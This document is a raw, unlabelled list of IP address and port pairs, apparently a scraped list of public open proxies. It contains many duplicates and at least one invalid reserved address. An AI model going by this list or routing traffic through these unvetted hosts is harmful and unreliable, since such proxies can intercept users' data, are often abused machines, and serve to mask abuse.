179.60.235.248:8097
179.95.203.179:8081
179.107.51.78:5566
179.189.48.253:8080
179.189.125.222:8080
179.190.97.135:8080
179.255.219.182:8080
180.94.64.58:8080
180.149.232.205:8080
180.178.98.93:2526
180.178.99.138:8080
180.178.99.138:80
180.178.103.66:8080
180.183.201.187:8080
180.183.232.243:8081
180.191.22.197:8080
180.191.23.47:8082
180.191.255.240:8081
180.210.160.70:8080
180.211.183.2:8080
180.211.191.58:8080
181.10.160.157:8080
181.10.204.85:999
181.13.254.54:999
181.37.240.89:999
181.39.24.154:999
181.39.24.156:999
181.45.148.40:80
181.57.216.110:999
181.65.128.140:999
181.65.128.141:999
181.65.133.242:999
181.65.169.35:999
181.78.8.215:999
181.78.15.105:999
181.78.22.196:999
181.78.27.34:999
181.78.27.38:999
181.78.94.170:999
181.78.104.183:999
181.113.135.254:52058
181.114.7.114:999
181.114.226.212:8080
181.114.226.213:8080
181.115.93.77:999
181.118.143.1:999
181.119.64.187:999
181.129.43.3:8080
181.129.52.154:42648
181.129.62.2:39843
181.129.70.82:46752
181.129.139.13:999
181.129.144.61:3629
181.129.182.186:999
181.129.208.27:999
181.143.191.138:999
181.143.228.106:30673
181.174.115.10:1994
181.174.224.63:999
181.174.228.34:999
181.174.228.35:999
181.176.161.39:999
181.188.206.32:999
181.191.92.17:8082
181.191.93.73:8082
181.191.223.58:999
181.194.226.73:8080
181.198.115.179:999
181.204.45.178:999
181.204.214.178:41890
181.205.41.210:7654
181.205.86.66:80
181.209.77.250:999
181.209.80.134:999
181.209.82.90:1994
181.209.82.204:999
181.209.95.10:999
181.209.95.13:999
181.209.97.190:9998
181.209.114.194:999
181.209.116.20:999
181.211.255.129:9898
181.212.41.171:999
181.225.101.14:999
181.225.101.52:999
181.233.62.11:999
182.16.185.12:8080
182.23.35.242:8080
182.23.77.122:8080
182.23.107.210:3128
182.93.65.239:8080
182.93.82.191:8080
182.160.9.217:7890
182.160.110.154:9898
182.176.164.41:8080
182.253.21.26:46977
182.253.28.124:8080
182.253.34.36:8080
182.253.36.72:443
182.253.40.100:8080
182.253.73.130:80
182.253.73.130:8080
182.253.94.177:8080
182.253.108.51:40448
182.253.181.255:8080
182.253.197.69:8080
182.253.216.238:8080
182.253.246.190:8080
183.87.106.126:23500
183.88.212.184:8080
183.88.228.208:8080
183.89.43.200:8080
183.89.114.66:8080
183.89.247.182:8080
183.91.86.174:8080
183.165.227.13:8089
183.165.244.241:8089
183.165.246.234:8089
183.165.249.75:8089
183.165.249.240:8089
183.165.250.46:8089
183.236.232.160:8080
185.23.110.106:8080
185.33.170.165:9999
185.33.170.167:9999
185.33.170.233:9999
185.37.186.159:4145
185.49.96.94:8080
185.49.107.172:8080
185.53.129.141:3128
185.54.102.209:8080
185.61.247.60:8080
185.73.202.85:80
185.82.96.162:9093
185.82.99.202:9093
185.103.181.2:8080
185.134.233.111:3111
185.153.44.74:8080
185.169.183.98:8080
185.193.137.109:8080
185.194.11.178:8080
185.194.11.180:8080
185.199.84.161:53281
185.200.37.10:8080
185.200.38.117:8080
185.229.30.32:8080
185.238.199.195:8080
186.0.144.131:92
186.1.206.154:3128
186.3.155.25:8080
186.24.9.118:999
186.24.12.93:999
186.67.192.246:8080
186.68.101.146:6969
186.72.101.86:999
186.96.97.85:999
186.96.111.179:999
186.96.141.199:999
186.96.253.216:999
186.97.172.178:60080
186.103.130.91:8080
186.115.217.107:8080
186.121.214.210:32650
186.125.235.101:999
186.125.235.253:999
186.150.201.38:8080
186.151.27.21:999
186.151.95.57:999
186.194.119.205:5566
186.194.160.121:999
186.194.160.211:999
186.208.81.214:3129
186.208.139.194:8080
186.211.177.161:8082
186.215.87.194:10326
186.215.87.194:6021
186.215.87.194:10320
186.216.127.224:3128
186.226.185.82:666
186.227.49.186:3128
186.232.160.246:8080
186.248.77.161:8080
186.248.77.173:8080
187.1.181.125:23500
187.17.232.6:8089
187.19.203.67:8080
187.45.127.87:20183
187.49.191.17:999
187.62.64.156:45005
187.73.188.35:8080
187.86.57.94:8999
187.94.211.214:8080
187.102.209.247:999
187.102.216.161:999
187.102.216.163:999
187.102.217.27:999
187.102.219.32:999
187.102.219.146:999
187.103.73.165:5566
187.109.40.9:20183
187.115.10.50:20183
187.188.143.100:999
187.188.152.53:999
187.188.167.108:8080
187.188.169.169:8080
187.188.171.73:6969
187.189.73.66:999
187.190.249.113:1994
187.190.249.114:1994
187.243.249.118:999
188.94.227.221:8080
188.124.230.43:19445
188.132.221.3:8080
188.132.221.4:8080
188.132.221.27:8080
188.132.221.212:8080
188.132.222.3:8080
188.132.222.5:8080
188.132.222.7:8080
188.132.222.18:8080
188.132.222.35:8080
188.132.222.45:8080
188.136.154.38:8080
188.240.192.92:8090
188.255.237.254:6666
189.90.255.208:3128
189.195.139.150:999
189.202.239.173:999
189.203.191.136:1994
190.2.210.116:999
190.2.212.20:999
190.8.142.84:999
190.9.48.81:999
190.9.48.161:999
190.12.95.170:47029
190.43.232.207:999
190.60.35.50:8080
190.61.57.45:8080
190.61.84.166:9812
190.61.88.154:999
190.61.101.39:8080
190.61.101.205:8080
190.61.102.67:999
190.71.229.42:999
190.82.105.123:43949
190.95.156.178:8080
190.97.236.201:1994
190.104.1.19:999
190.104.20.82:8080
190.104.20.84:8080
190.104.36.181:8080
190.104.47.238:8080
190.107.145.58:999
190.109.16.145:999
190.109.168.217:8080
190.110.99.187:999
190.110.99.188:999
190.110.99.189:999
190.110.99.190:999
190.112.38.65:5555
190.112.39.65:5555
190.119.102.251:999
190.119.102.253:999
190.119.174.190:999
190.121.153.93:999
190.121.157.142:999
190.124.165.199:3128
190.124.166.226:999
190.128.129.10:8080
190.128.219.132:999
190.145.147.139:999
190.152.8.74:32650
190.185.116.161:999
190.186.1.65:999
190.186.1.126:999
190.186.250.11:999
190.187.201.26:8080
190.195.69.52:3128
190.195.225.34:8080
190.210.223.90:8080
190.214.52.226:53281
190.217.10.12:999
190.239.221.226:999
190.247.93.231:8080
190.254.0.110:999
191.7.208.34:8080
191.37.55.182:8989
191.53.112.170:45619
191.97.3.121:999
191.97.6.213:999
191.97.9.83:999
191.97.14.26:999
191.97.15.22:999
191.102.68.105:999
191.102.68.178:999
191.102.107.235:999
191.102.254.10:8085
191.102.254.10:8084
191.102.254.11:8085
191.102.254.11:8084
191.102.254.11:8083
191.102.254.26:8085
191.102.254.28:8085
191.102.254.28:8084
191.102.254.28:8081
192.82.66.83:8080
192.141.196.129:8080
192.145.183.22:8080
193.138.178.6:8282
194.29.101.140:3128
194.31.33.36:8080
194.169.167.5:8080
194.186.35.70:3128
195.3.245.193:3128
195.3.246.209:3128
195.140.146.3:3128
195.140.147.62:3128
195.158.83.13:8999
195.174.142.76:8080
195.178.56.37:8080
195.181.152.71:3128
195.250.92.58:8080
196.0.113.10:56861
196.2.15.159:8080
196.20.12.21:8080
196.20.12.25:8080
196.202.210.35:32650
196.216.65.57:8080
196.216.132.196:8082
196.216.134.60:8082
196.251.221.2:8104
196.251.221.2:8103
196.251.222.217:8104
197.155.73.82:8081
197.155.230.206:8080
197.157.143.50:8080
197.211.12.6:8080
197.221.85.214:8080
197.232.65.40:55443
197.248.86.237:32650
198.27.74.6:9300
198.52.241.15:999
198.229.231.13:8080
200.4.217.203:999
200.6.185.62:6969
200.7.10.158:8080
200.8.180.118:999
200.24.134.99:999
200.24.204.245:999
200.25.254.193:54240
200.46.65.66:8080
200.54.22.74:8080
200.54.22.74:80
200.58.87.195:8080
200.58.180.108:32650
200.60.119.131:9991
200.60.119.131:999
200.60.132.83:999
200.61.16.80:8080
200.76.42.194:999
200.76.42.202:999
200.85.169.18:47548
200.92.201.138:999
200.105.215.22:33630
200.106.184.21:999
200.106.184.97:999
200.106.187.252:999
200.110.173.17:999
200.111.182.6:443
200.119.110.27:999
200.123.15.121:999
200.123.15.126:999
200.123.228.184:999
200.123.231.220:999
200.125.170.126:8080
200.125.171.196:999
200.125.171.202:9991
200.125.171.238:999
200.170.210.237:8080
200.217.165.114:8080
200.229.147.2:999
201.30.192.149:8080
201.54.176.13:8080
201.71.2.109:999
201.71.2.177:999
201.76.218.220:9898
201.77.108.1:999
201.77.108.160:999
201.77.108.161:999
201.77.108.192:999
201.77.108.196:999
201.91.82.155:3128
201.131.103.234:999
201.131.239.233:999
201.157.254.26:8080
201.163.73.93:55443
201.164.60.222:999
201.174.152.186:999
201.174.152.190:999
201.182.82.16:1994
201.184.53.180:999
201.184.72.178:999
201.187.103.18:8080
201.217.246.178:8080
201.218.137.227:999
201.219.247.34:999
201.220.148.1:999
201.221.9.105:8080
201.222.76.34:999
201.229.250.21:8080
201.243.82.210:999
201.244.127.210:8080
202.8.74.10:8080
202.12.80.158:82
202.53.171.114:80
202.53.171.114:8080
202.62.11.203:8080
202.69.38.82:8080
202.92.5.136:38915
202.93.229.234:8080
202.131.159.210:1111
202.131.159.210:80
202.137.15.253:3888
202.137.31.155:5678
202.137.134.160:8088
202.138.244.85:9384
202.138.249.185:8080
202.141.235.34:41890
202.142.158.114:8080
202.146.228.251:8088
202.146.228.253:8088
202.150.152.154:8080
202.154.18.86:3125
202.164.152.230:8080
202.164.208.39:1080
202.169.58.22:3128
202.169.229.139:53281
202.180.20.10:55443
202.180.20.11:55443
202.182.55.46:8080
203.89.29.41:6060
203.89.29.52:6060
203.89.29.53:6060
203.95.198.239:32650
203.128.71.83:8080
203.128.71.84:8080
203.128.75.194:8080
203.142.77.226:8080
203.150.128.221:8080
203.150.172.151:8080
203.189.142.168:53281
203.202.255.67:8080
203.210.85.119:8080
204.157.247.44:999
204.199.129.38:999
205.164.182.254:999
206.41.242.129:8080
206.62.64.34:8080
206.62.165.42:999
206.161.97.5:31337
206.161.97.47:31337
207.246.112.27:999
209.222.98.213:55909
210.200.169.134:33333
212.12.24.57:8090
212.46.230.102:6969
212.89.188.115:21231
212.92.204.54:8080
212.92.204.54:80
212.95.180.50:53281
212.108.144.67:8080
212.112.127.20:8080
212.126.96.154:8080
212.154.82.52:9090
212.174.55.151:8080
212.174.242.114:8080
212.175.55.148:8085
212.252.73.6:8080
212.252.73.6:1873
213.6.17.251:19000
213.6.36.2:8080
213.6.197.162:19000
213.74.163.181:8080
213.82.87.21:443
213.171.63.210:41890
213.178.39.170:8080
213.207.195.178:8080
216.74.255.182:8080
216.74.255.182:80
216.215.123.174:8080
216.236.243.57:8080
217.66.200.154:3128
217.197.237.74:8080
217.219.28.114:3128
217.251.108.48:8080
218.4.62.141:8080
221.6.201.74:9999
221.121.12.238:36077
221.226.75.86:55443
222.124.193.114:8080
222.127.186.27:8082
222.127.255.21:9999
222.129.138.90:9000
222.165.205.154:8089
222.252.23.5:8080
223.25.100.42:2222
223.25.100.234:8080
223.108.49.50:3128
223.206.128.172:8080
223.207.96.29:8080
223.207.105.208:8080
223.215.176.94:8089
223.247.47.68:8089
223.247.47.162:8089
118.173.230.19:1080
161.97.143.60:28774
144.91.66.30:20819
140.238.34.53:8080
112.5.128.78:8060
45.79.189.110:24248
161.97.173.42:37455
51.210.45.148:41855
95.217.106.245:2501
103.69.151.189:8080
79.137.198.31:32268
207.180.222.186:19197
141.94.174.6:4127
128.199.165.63:46613
165.227.196.37:63389
171.100.139.27:8080
213.14.31.123:35314
220.247.162.70:9990
121.101.131.44:8080
39.107.33.254:8090
67.43.227.227:4341
183.164.243.252:8089
188.165.237.26:52982
80.14.47.254:3128
103.133.27.143:8080
162.55.95.91:44674
107.152.98.5:4145
172.104.154.229:7974
208.87.131.151:57951
98.162.25.29:31679
171.243.26.172:40326
198.199.115.151:10892
45.81.232.17:16458
98.181.137.80:4145
37.220.85.131:13981
43.153.107.218:9876
92.205.61.38:47131
195.250.81.34:81
72.210.221.197:4145
24.152.50.114:999
203.142.74.115:8080
207.180.234.220:47348
38.7.109.253:8080
54.36.108.149:18173
45.11.95.165:6031
67.43.236.20:16115
103.231.78.36:80
45.119.113.81:84
154.236.191.42:1981
117.160.250.131:8899
14.177.235.17:8080
148.72.177.90:28106
219.129.167.82:2222
67.43.227.227:1031
157.245.130.145:34106
144.91.66.30:14989
8.130.39.155:3389
45.81.232.17:40610
147.135.46.7:22107
188.166.230.38:13281
161.97.170.209:13378
109.225.40.145:8080
116.203.136.67:1081
177.93.50.156:999
49.231.0.178:58023
51.89.173.40:54570
184.178.172.23:4145
72.217.216.239:4145
183.234.85.26:9002
108.170.12.13:80
119.47.90.43:8080
8.242.127.203:999
173.249.31.25:15567
192.163.204.80:10647
24.121.173.151:3128
164.132.112.254:22652
102.66.221.75:8080
132.148.129.254:45883
51.83.132.102:22862
165.227.196.37:50275
1.1.104.70:9999
194.233.78.142:42369
68.71.249.153:48606
185.116.22.66:80
201.89.89.34:8080
223.247.46.236:8089
137.184.85.97:5634
148.72.23.56:41290
67.43.227.227:23055
38.242.238.254:58535
94.23.220.136:39648
79.137.198.31:33366
223.247.47.230:8089
195.114.209.50:80
82.64.77.30:80
104.200.135.46:4145
138.68.155.22:1668
178.32.73.29:48403
120.197.160.2:9002
203.96.177.211:63619
207.180.222.186:37871
104.238.140.80:8888
210.211.113.37:80
166.62.38.100:5797
192.252.214.20:15864
171.244.140.160:31014
5.189.184.147:44097
164.132.163.73:48444
5.161.98.204:3240
162.55.95.91:23383
58.221.193.74:8888
171.243.26.172:40094
79.137.32.83:62629
190.242.125.186:8080
51.79.87.144:22500
167.114.107.37:80
51.89.21.99:37822
165.16.27.109:1981
135.148.10.161:64386
51.79.229.202:3128
103.121.90.216:10526
80.84.176.110:8080
78.128.95.125:4153
222.209.81.12:10800
103.216.49.57:8080
58.222.166.122:10800
23.94.214.8:9054
103.114.52.102:8080
39.109.113.97:3128
167.172.238.15:10003
162.214.111.84:31232
41.65.0.203:1981
148.72.23.135:23988
202.179.188.178:8080
185.79.243.153:31382
128.199.5.121:28067
118.172.239.231:8180
132.148.154.97:46894
51.79.229.230:51134
161.97.147.193:29901
79.106.228.212:8080
152.228.135.42:12438
162.144.79.37:56225
162.214.111.84:31232
197.201.96.123:80
92.205.108.112:50200
173.212.237.43:47229
98.162.25.4:31654
183.88.239.223:8081
103.147.247.175:8181
5.189.184.147:1930
185.237.206.204:3128
51.210.45.148:36424
116.99.239.6:30046
200.108.190.110:999
103.81.212.192:84
117.74.65.29:1000
141.94.174.6:2935
187.95.34.135:8080
189.250.125.13:999
67.43.227.228:8291
196.223.129.21:80
111.93.235.76:80
191.37.155.135:5678
62.210.122.213:47951
80.78.237.2:55443
103.162.31.91:33829
79.137.198.31:15383
142.54.228.193:4145
187.111.194.25:8080
223.243.243.101:8089
38.49.143.114:8080
204.44.192.80:56149
213.251.185.168:61477
138.0.26.120:9010
112.78.155.77:8080
124.107.144.249:8082
162.55.95.91:28825
207.180.222.186:20255
50.63.12.33:61464
104.238.111.107:15073
162.55.95.91:64198
114.129.2.82:8081
38.156.235.113:999
120.37.121.209:9091
164.92.86.113:50140
114.79.148.218:80
218.255.187.60:80
23.152.40.15:5050
54.36.108.149:13882
213.136.78.200:46064
190.72.102.42:999
120.196.207.10:80
162.214.163.137:21341
199.187.210.54:4145
200.108.197.2:8080
5.56.124.176:6734
45.81.232.17:2073
198.27.82.143:60434
102.132.48.60:8080
34.176.41.25:3128
139.162.238.184:25355
171.243.26.172:40062
103.81.214.235:84
172.93.111.235:28319
67.43.227.227:2083
51.38.63.124:29602
213.251.185.168:64758
118.112.89.57:8118
200.106.124.14:999
104.238.111.107:45883
161.97.115.17:26772
58.147.190.110:8080
103.166.141.74:20074
188.132.221.169:8080
109.123.253.20:56888
200.45.73.115:3188
91.189.177.190:3128
132.148.154.97:5863
210.245.51.230:9898
207.180.226.58:18463
114.4.241.210:5678
185.208.183.122:3128
113.161.59.136:8080
141.94.174.6:64467
159.65.3.96:61556
51.68.230.210:27591
37.44.238.2:60796
41.111.243.18:80
213.251.185.168:62208
194.182.178.90:3128
171.243.26.172:40758
51.161.131.84:49159
138.91.159.185:80
162.55.95.91:6690
162.241.6.97:35944
51.79.87.144:54395
190.54.12.74:5678
162.144.79.37:51475
128.199.183.41:4200
68.1.210.163:4145
132.148.129.254:45366
50.63.12.101:58932
45.138.87.238:1080
103.156.249.52:80
154.236.179.226:1974
162.214.225.223:34584
139.59.61.193:40408
192.111.135.17:18302
45.81.232.17:30971
69.167.169.46:63421
79.137.32.83:6604
213.136.93.115:12679
173.212.240.168:6048
67.43.227.228:31011
198.199.115.151:27811
202.29.214.22:4153
141.94.174.6:33346
36.89.10.51:44268
164.132.162.92:38950
161.97.173.42:53948
103.121.90.216:40961
144.217.66.186:15505
67.43.236.20:26911
80.82.77.2:20496
41.231.37.76:3128
135.125.9.103:55095
171.244.140.160:43886
112.30.155.83:12792
213.251.185.168:45727
198.176.56.43:80
58.75.126.235:4145
146.190.35.141:8000
192.111.137.35:4145
202.151.163.10:1080
213.136.78.200:58530
117.4.50.142:32650
188.164.197.178:4612
54.36.122.16:58072
103.162.31.38:49935
147.124.212.31:64661
171.244.140.160:44046
1.32.59.217:47045
213.136.78.200:41713
47.114.101.57:8888
45.117.179.209:80
51.38.63.124:60484
62.171.131.101:31588
66.42.224.229:41679
190.73.109.107:8080
162.214.111.61:50109
138.68.155.22:15537
45.56.220.220:64645
1.27.226.210:8060
45.204.82.28:443
51.210.45.148:36721
72.217.158.202:4145
79.137.198.31:35058
36.92.87.73:5678
159.223.166.21:40320
195.201.173.249:25199
192.169.226.96:31640
222.138.76.6:9002
117.54.114.100:80
5.83.244.250:8080
194.163.160.203:20140
213.165.168.190:9898
117.74.65.215:8100
162.55.95.91:51446
222.252.24.246:8080
162.214.67.122:29826
38.41.0.89:999
141.94.174.6:3096
192.111.138.29:4145
193.136.97.17:80
192.252.209.155:14455
141.94.174.6:1772
85.143.254.38:1080
162.214.194.127:34858
8.142.132.204:18080
162.214.195.64:36203
166.62.122.168:60031
133.232.90.156:80
122.116.29.68:4145
177.240.16.10:999
192.169.205.131:39557
91.241.217.58:9090
198.12.253.60:34121
134.209.30.88:3128
171.243.26.172:34258
148.72.22.219:53191
187.252.154.90:4153
205.233.79.134:999
142.54.232.6:4145
31.200.242.201:12196
144.22.204.123:1111
103.1.93.55:80
92.205.60.110:26623
139.162.238.184:62511
213.136.93.115:14087
213.136.93.115:14087
162.241.45.22:57295
117.160.250.132:80
46.173.35.229:3629
39.99.144.43:80
141.94.174.6:59583
94.131.14.66:3128
198.12.253.60:17878
162.241.115.85:54159
185.129.250.183:54266
213.252.245.221:8556
103.131.8.37:5678
91.189.177.186:3128
67.43.236.20:24015
79.137.248.127:30744
148.72.213.202:27170
162.240.49.196:14237
184.168.121.153:39089
147.124.212.31:3793
66.29.149.86:51842
207.180.226.58:8120
130.255.162.199:20467
162.241.45.22:40036
117.160.250.134:8899
103.106.203.119:443
93.87.49.86:8080
94.130.66.172:17742
138.68.155.22:1668
51.83.132.102:52658
132.148.128.88:9553
41.59.112.250:3030
144.91.69.188:60429
92.242.212.50:8080
149.28.68.194:8888
171.243.26.172:40134
185.103.26.78:3128
170.83.242.250:999
54.36.108.149:13882
51.161.131.84:64174
104.40.148.100:8080
37.1.212.18:2001
67.43.227.228:20583
187.21.129.2:8080
171.243.26.172:40166
92.205.108.112:50200
212.83.143.223:56749
123.182.58.44:8089
209.145.59.247:5404
185.185.169.84:8080
67.227.196.235:64887
103.229.82.166:8080
185.87.121.5:8975
38.45.251.240:999
92.204.136.149:64892
64.202.184.129:48191
184.168.121.153:42321
213.251.185.168:1832
103.49.202.252:80
184.181.217.220:4145
79.137.198.31:33120
154.57.7.36:80
67.43.236.20:19261
210.72.11.46:3128
72.10.164.178:11919
141.94.174.6:10879
51.38.63.124:52117
141.94.174.6:46774
20.193.135.50:80
107.180.93.131:15564
159.203.137.249:61648
162.214.111.199:47038
137.220.61.75:62131
85.95.167.124:11110
192.111.135.18:18301
162.241.53.72:39591
192.252.208.67:14287
67.43.236.20:6669
91.189.177.188:3128
103.159.47.34:82
68.71.247.130:4145
8.222.248.23:15673
210.211.113.36:80
162.243.95.8:80
124.6.165.241:8085
45.132.75.19:28005
27.154.57.94:10800
162.55.95.91:10633
123.126.158.50:80
161.97.115.244:39824
210.211.113.34:80
51.210.4.123:50683
115.74.246.138:8080
98.162.25.23:4145
104.36.166.34:27899
45.11.95.165:5032
51.210.4.123:52614
167.99.123.158:2607
190.6.23.221:999
207.180.222.186:23639
213.251.185.168:16901
146.70.157.98:3128
195.201.173.249:4538
67.43.236.20:33033
213.136.78.200:45488
138.68.155.22:11712
82.165.105.48:80
198.12.251.108:3606
103.216.50.11:8080
114.156.77.107:8080
184.181.217.206:4145
162.241.46.6:45820
190.104.254.240:4153
213.32.252.134:5678
94.228.162.155:30305
51.68.230.210:38678
200.37.253.75:999
161.97.143.60:28774
72.10.160.171:13267
173.249.53.61:40069
184.178.172.3:4145
171.253.102.137:8080
166.62.122.168:60031
167.86.115.250:25027
151.106.59.221:30310
141.94.174.6:20292
161.97.165.57:6484
117.57.92.248:8089
181.129.74.58:30431
209.13.186.20:80
80.67.8.6:80
162.214.111.61:46816
194.247.173.17:8080
135.148.10.161:44549
173.212.237.43:11331
152.32.130.117:18080
69.167.169.46:49294
51.75.126.150:4362
51.210.45.148:3865
89.28.32.203:57391
171.243.26.172:40134
188.164.193.178:8500
5.189.184.147:27191
148.72.213.202:27170
208.102.51.6:58208
45.5.139.241:8080
139.159.176.147:8090
72.10.164.178:10775
117.160.250.163:8081
192.163.201.131:32263
123.182.59.231:8089
149.18.31.159:8085
103.136.106.34:80
141.94.174.6:17141
72.210.252.137:4145
94.131.14.66:1080
184.168.121.153:6471
161.97.143.60:44908
159.203.137.249:46774
72.10.164.178:8335
109.123.254.43:27886
111.225.152.211:8089
117.74.65.29:5555
72.167.54.228:17210
117.160.250.163:9990
188.164.193.178:7001
141.94.174.6:41388
66.29.149.86:40487
117.57.93.1:8089
209.59.158.93:62888
202.53.174.17:1080
162.55.95.91:22926
184.168.121.153:44061
152.228.140.225:60387
65.20.192.210:64948
171.243.26.172:40334
192.111.139.162:4145
31.217.221.74:8192
139.59.61.193:51890
139.129.202.244:80
184.181.217.201:4145
213.91.232.94:8080
98.178.72.21:10919
81.17.94.50:47163
181.37.240.89:999
138.68.235.51:80
199.102.105.242:4145
185.32.4.129:4153
137.184.182.145:20822
188.164.197.178:17868
67.43.236.20:2935
37.120.188.156:61121
72.10.160.174:31083
188.132.222.8:8080
213.251.185.168:12345
122.3.41.154:8090
72.10.164.178:1545
184.178.172.17:4145
51.38.63.124:6133
180.175.78.150:88
162.241.66.135:34375
92.205.60.110:26623
109.123.254.43:46632
184.181.217.201:4145
201.77.108.21:999
207.180.222.186:52404
54.36.108.149:18173
83.243.92.154:8080
161.97.143.60:49340
207.180.198.241:37209
20.163.133.5:80
54.37.244.208:12083
181.15.154.156:52033
80.241.44.34:5678
80.13.43.193:80
67.43.236.20:21953
45.79.189.110:24248
201.13.147.161:5678
51.222.241.157:2563
51.89.21.99:31924
172.93.111.235:32268
162.55.95.91:59987
39.106.60.216:3128
162.214.111.61:46816
192.169.205.131:45366
186.125.235.213:999
37.139.26.54:3128
204.44.192.104:53783
154.208.10.126:80
117.1.252.143:9002
167.99.123.158:59849
160.248.80.91:22
72.206.181.103:4145
67.43.236.20:6429
13.40.247.115:80
67.227.196.237:64887
62.171.131.101:33280
202.62.11.200:8080
141.94.174.6:24085
67.43.236.20:5045
62.210.122.213:28302
67.43.236.20:16437
203.174.26.129:4153
123.182.58.100:8089
157.245.130.145:34106
164.132.112.254:50892
203.160.186.246:8080
95.0.206.222:8080
186.148.181.70:999
103.15.140.177:44759
161.97.147.193:7518
147.135.129.229:35025
207.180.226.58:59932
72.10.164.178:2651
154.65.39.7:80
164.132.112.254:60387
171.243.26.172:40078
72.210.221.223:4145
47.100.201.85:443
41.79.237.247:1080
181.110.213.35:3128
67.43.227.227:16727
117.4.242.216:5678
195.138.90.226:3128
54.38.179.162:8459
91.205.197.226:8080
51.79.229.230:54457
103.83.178.205:2016
66.228.40.212:32027
107.148.201.157:80
95.143.12.201:60505
51.195.115.21:8080
173.249.31.25:15567
171.244.140.160:34233
78.141.238.119:57614
45.171.242.3:8083
51.79.87.144:30464
192.111.129.145:16894
103.48.68.101:83
111.225.153.68:8089
47.93.114.68:88
103.25.79.178:4700
179.1.198.35:999
111.59.4.88:9002
89.134.183.173:18080
45.81.232.17:64824
117.74.65.29:20002
200.174.198.95:8888
204.199.120.30:999
103.152.112.167:80
36.134.91.82:8888
74.208.177.198:80
94.130.66.172:59252
51.38.63.124:17601
191.102.254.27:8085
159.65.186.46:10000
148.251.13.78:8178
171.244.10.204:43012
95.217.188.41:63388
117.74.65.207:54466
192.111.130.5:17002
132.148.244.30:9231
67.43.228.250:27015
194.233.78.142:42420
72.10.160.170:30407
122.114.232.137:808
45.79.189.110:62703
38.127.172.137:47421
171.243.26.172:40326
51.15.21.216:51448
103.154.160.50:80
161.97.170.209:10839
170.83.246.128:8080
181.78.11.217:999
155.94.241.131:3128
51.255.79.92:54073
103.87.212.140:8999
95.23.214.53:8085
87.238.192.249:35958
213.251.185.168:64556
187.250.172.88:999
45.70.200.122:999
154.236.191.48:1981
45.5.118.43:999
178.128.82.105:46921
37.187.91.192:27898
141.94.174.6:60870
68.183.48.146:10010
147.135.254.45:60562
213.32.66.64:50163
103.169.128.152:8080
171.244.140.160:28775
139.59.1.14:3128
113.223.214.75:8089
183.165.245.48:8089
117.102.85.163:55435
179.189.222.187:999
217.21.148.50:33192
162.215.222.207:48808
45.174.253.16:999
132.148.128.8:41982
67.227.196.235:54716
66.29.129.56:62604
178.251.26.57:7838
154.12.253.232:17970
45.91.93.166:32287
103.176.45.227:3128
198.37.57.112:80
111.225.152.47:8089
103.133.26.100:8181
199.58.184.97:4145
93.170.123.5:4555
185.51.92.108:51327
139.99.9.218:28639
72.10.160.170:21379
67.227.196.237:64887
103.69.90.214:8081
173.212.237.43:30228
103.10.120.165:80
34.88.54.123:3128
71.14.23.121:8080
47.102.121.213:80
45.56.220.220:60217
72.206.181.123:4145
103.216.49.151:8080
50.63.13.3:4303
67.43.228.250:20571
103.147.246.42:8080
45.56.84.254:55123
178.33.167.180:7306
67.227.196.235:62888
107.180.91.248:57846
31.156.152.46:80
67.43.227.230:8357
115.127.190.42:6979
50.63.12.33:40838
88.210.20.144:20000
72.10.164.178:29895
34.86.61.60:3128
54.38.179.162:8459
101.36.120.133:30010
219.243.212.118:1080
72.167.54.228:42236
200.39.154.1:999
218.75.102.198:8000
207.180.222.186:18844
130.51.20.187:3128
113.125.82.11:3128
69.167.169.46:30833
51.222.241.8:36411
64.92.125.43:49603
143.47.244.130:3128
64.225.8.118:10000
103.164.213.78:8088
117.160.250.134:80
80.249.112.162:80
51.83.132.102:22862
62.171.131.101:24650
128.199.196.31:1217
117.74.65.215:49857
176.99.2.43:1081
5.42.78.239:14021
207.180.219.93:52035
161.97.147.193:38385
162.214.103.84:27295
202.162.43.241:8080
102.130.125.86:80
202.5.35.13:5020
111.225.153.45:8089
171.244.10.204:55145
37.195.222.7:52815
198.8.94.170:4145
188.164.196.31:49426
79.137.198.31:32809
209.145.59.247:57670
51.210.4.123:61802
207.180.234.220:48963
54.36.122.16:57906
171.243.26.172:40094
188.164.197.178:18428
109.123.254.43:17179
45.81.232.17:43308
5.42.78.239:11440
199.187.210.54:4145
72.167.220.208:27723
128.199.183.41:5585
62.171.131.104:2448
132.148.245.247:38315
51.222.241.8:55452
38.156.233.75:999
82.210.56.251:80
103.163.244.4:82
122.53.233.36:8082
152.228.134.212:12949
67.43.236.20:11419
159.138.122.91:18080
95.67.79.254:8080
41.60.26.210:32650
49.12.126.53:13940
67.227.196.236:50420
117.69.233.253:8089
222.127.50.56:8082
159.203.137.249:60565
196.20.12.29:8080
45.189.252.81:999
162.214.67.122:19182
207.180.226.58:44977
115.76.193.154:24030
92.246.139.106:35130
24.249.199.12:4145
146.59.178.222:12438
68.183.143.134:80
141.94.174.6:46774
50.250.205.21:32100
72.10.164.178:4711
72.10.160.171:6363
159.223.166.21:43352
201.71.2.249:999
192.111.139.162:4145
203.95.196.161:8080
80.92.227.185:5678
98.178.72.21:10919
14.160.26.105:19132
162.55.95.91:11837
201.71.2.103:999
212.103.125.48:1080
117.70.48.226:8089
92.205.61.38:4038
51.68.230.210:27591
92.205.61.38:26351
115.171.217.48:7890
45.11.95.165:5022
50.63.12.33:23065
213.207.43.189:80
171.243.26.172:40070
51.15.133.214:16379
201.91.82.155:3128
154.12.253.232:54506
64.202.186.2:62341
152.228.140.225:22652
72.10.160.173:17149
129.146.45.163:31289
103.113.71.230:3128
147.135.129.229:7701
5.161.98.204:53935
142.54.231.38:4145
198.44.255.3:80
114.134.92.46:8080
45.236.44.94:8080
201.217.246.212:8080
31.197.253.254:48678
103.127.1.130:80
162.214.225.223:37858
67.43.227.226:8721
120.33.126.200:3128
89.116.229.56:80
142.93.66.21:52302
103.57.211.92:3128
162.144.79.37:51475
123.182.59.149:8089
72.10.164.178:28403
98.6.220.90:8899
103.60.214.18:51754
144.91.115.113:33941
94.154.152.108:8079
176.99.2.43:1080
213.136.93.115:12679
161.97.115.244:47279
88.208.34.131:18081
103.173.139.234:8080
141.95.160.178:57753
102.132.201.202:80
212.156.217.147:4153
117.54.142.46:8080
72.10.160.172:28791
107.180.106.173:32144
92.246.139.106:33707
253.255.255.123:38803
45.79.189.110:27708
72.217.158.202:4145
41.74.91.244:80
218.57.210.186:9002
147.182.163.223:3128
61.158.175.38:9002
103.118.46.174:8080
89.40.227.114:57176
160.248.80.91:137
213.136.78.200:45622
46.38.230.49:37873
189.186.130.192:999
5.189.184.147:46190
8.137.34.229:80
161.97.160.158:18166
78.28.152.113:80
103.61.75.240:3128
72.10.164.178:1027
